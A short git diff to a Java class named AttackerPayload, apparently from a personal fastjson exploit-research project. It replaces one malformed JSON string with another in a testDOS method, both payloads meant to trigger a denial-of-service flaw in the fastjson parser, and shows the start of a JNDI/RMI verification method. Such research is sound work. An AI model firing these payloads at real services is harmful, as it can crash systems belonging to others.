@@ -10,6 +10,7 @@ import javax.naming.NamingException;
 
 import com.alibaba.fastjson.JSON;
 import com.alibaba.fastjson.JSONObject;
+import com.lyhistory.rce.fastjson.ParseObject;
 
 /**
  * 
@@ -25,8 +26,8 @@ public class AttackerPayload {
 	}
 	public static void testDOS() {
 
-		JSON.parse("[{\"a\":\"a\\x]");
-
+		//JSON.parse("[{\"a\":\"a\\x]");
+		JSON.parseObject("{\"topics\":\"a\",\"oper\":\"b\\x",ParseObject.class);
 	}
 	public static void verifyRmi() throws NamingException, MalformedURLException, RemoteException, NotBoundException {
 		Context context = new InitialContext();
